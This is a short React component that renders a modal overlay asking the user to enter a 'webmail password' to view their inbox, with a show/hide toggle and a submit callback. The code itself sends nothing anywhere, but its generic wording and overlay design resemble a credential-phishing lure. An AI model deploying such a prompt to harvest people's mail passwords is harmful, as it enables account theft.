"use client";

import React, { useState } from "react";

interface AccessModalProps {
  isVisible: boolean;
  password: string;
  onChangePassword: (e: React.ChangeEvent<HTMLInputElement>) => void;
  onSubmit: () => void;
}

const AccessModal: React.FC<AccessModalProps> = ({
  isVisible,
  password,
  onChangePassword,
  onSubmit,
}) => {
  const [showPassword, setShowPassword] = useState(false);

  if (!isVisible) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-40">
      <div className="bg-white p-6 rounded-lg shadow-lg w-full max-w-sm text-center">
        <h2 className="text-lg font-semibold mb-4">🔐 Webmail Access Required</h2>
        <p className="text-sm text-gray-600 mb-4">
          Please enter your webmail password to view your inbox.
        </p>
        <div className="relative mb-4">
          <input
            type={showPassword ? "text" : "password"}
            placeholder="Webmail Password"
            value={password}
            onChange={onChangePassword}
            className="border w-full px-3 py-2 text-xs pr-10"
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-2 top-1/2 transform -translate-y-1/2 text-xs text-blue-600"
          >
            {showPassword ? "Hide" : "Show"}
          </button>
        </div>
        <button
          onClick={onSubmit}
          className="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded text-xs"
        >
          Submit
        </button>
      </div>
    </div>
  );
};

export default AccessModal;
